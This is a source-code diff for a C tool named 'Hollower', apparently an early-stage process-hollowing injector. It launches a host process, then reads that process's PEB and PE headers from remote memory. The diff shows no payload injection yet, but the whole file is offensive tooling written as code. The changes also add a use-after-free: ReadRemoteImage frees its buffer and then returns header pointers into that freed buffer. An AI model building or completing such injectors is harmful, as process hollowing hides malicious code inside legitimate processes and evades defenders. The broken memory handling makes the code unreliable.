@@ -5,6 +5,7 @@
 #include "Hollower.h"
 
 _PPEB ReadRemotePEB(HANDLE);
+PLOADED_IMAGE ReadRemoteImage(HANDLE, LPCVOID);
 
 //
 // Hollower logic
@@ -12,6 +13,7 @@ _PPEB ReadRemotePEB(HANDLE);
 INT main() {
 	STARTUPINFOA			startupInfo;
 	PROCESS_INFORMATION		processInformation;
+	PLOADED_IMAGE			pImage = NULL;
 	_PPEB					pPEB = NULL;
 	BOOL					bRet;
 	HANDLE					hHostProcess;
@@ -40,7 +42,7 @@ INT main() {
 	hHostProcess = processInformation.hProcess;
 	pPEB = ReadRemotePEB(hHostProcess);
 
-
+	pImage = ReadRemoteImage(hHostProcess, pPEB->lpImageBaseAddress);
 
 lblCleanup:
 	if (processInformation.hProcess)
@@ -51,6 +53,9 @@ lblCleanup:
 
 	if (pPEB)
 		free(pPEB);  // todo: replace with virtualfree
+
+	if (pImage)
+		free(pImage);   // todo: replace with virtualfree
 }
 
 //
@@ -87,7 +92,6 @@ PPROCESS_BASIC_INFORMATION FindRemotePEB(HANDLE hProcess) {
 _PPEB ReadRemotePEB(HANDLE hProcess) {
 	PPROCESS_BASIC_INFORMATION	pBasicInfo = FindRemotePEB(hProcess);
 	DWORD						dwPEBAddress = pBasicInfo->PebBaseAddress;
-	_PPEB						pRetVal = NULL;
 
 	_PPEB pPEB = malloc(sizeof(_PEB));  // todo: Replace with virtualalloc
 	if (!pPEB)
@@ -98,19 +102,23 @@ _PPEB ReadRemotePEB(HANDLE hProcess) {
 		pPEB,
 		sizeof(_PEB),
 		0);
-	if (bSuccess)
-		pRetVal = pPEB;
+	if (!bSuccess) {
+		free(pPEB);
+		pPEB = NULL;    // todo: replace with virtualfree
+	}
 
 	if (pBasicInfo)
 		free(pBasicInfo);  // todo: replace with virtualfree
 
-	return pRetVal;
+	return pPEB;
 }
 
-#define BUFFER_SIZE 0x2000
-
-PLOADED_IMAGE ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress) {  // todo: fix malloc
-	BYTE* lpBuffer = malloc(BUFFER_SIZE);
+PLOADED_IMAGE ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress) {
+	PLOADED_IMAGE pImage = NULL;
+	
+	BYTE* lpBuffer = malloc(BUFFER_SIZE);  // todo: Replace with virtualalloc
+	if (!lpBuffer)
+		return NULL;
 
 	BOOL bSuccess = ReadProcessMemory(hProcess,
 		lpImageBaseAddress,
@@ -118,20 +126,20 @@ PLOADED_IMAGE ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress) {  //
 		BUFFER_SIZE,
 		0);
 	if (!bSuccess)
-		return 0;
+		goto lblCleanup;
 
 	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)lpBuffer;
-	PLOADED_IMAGE pImage = malloc(sizeof(LOADED_IMAGE));
+	pImage = malloc(sizeof(LOADED_IMAGE));  // todo: Replace with virtualalloc
+	if (!pImage)
+		goto lblCleanup;
 
-	pImage->FileHeader =
-		(PIMAGE_NT_HEADERS32)(lpBuffer + pDOSHeader->e_lfanew);
+	pImage->FileHeader = (PIMAGE_NT_HEADERS32)(lpBuffer + pDOSHeader->e_lfanew);
+	pImage->NumberOfSections = pImage->FileHeader->FileHeader.NumberOfSections;
+	pImage->Sections = (PIMAGE_SECTION_HEADER)(lpBuffer + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
 
-	pImage->NumberOfSections =
-		pImage->FileHeader->FileHeader.NumberOfSections;
-
-	pImage->Sections =
-		(PIMAGE_SECTION_HEADER)(lpBuffer + pDOSHeader->e_lfanew +
-			sizeof(IMAGE_NT_HEADERS32));
+lblCleanup:
+	if (lpBuffer)
+		free(lpBuffer);  // todo: replace with virtualfree
 
 	return pImage;
 }
